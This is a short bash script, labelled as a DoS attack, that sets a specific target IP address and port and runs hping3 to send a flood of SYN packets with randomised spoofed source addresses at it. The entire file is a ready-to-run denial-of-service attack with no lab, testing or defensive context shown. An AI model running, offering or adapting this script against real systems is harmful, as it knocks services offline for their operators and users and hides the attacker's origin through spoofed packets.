#!/bin/bash

# DoS attack using hping3 
TARGET=123.100.20.1
PORT=5005

hping3 -S --rand-source --flood -p $PORT $TARGET 
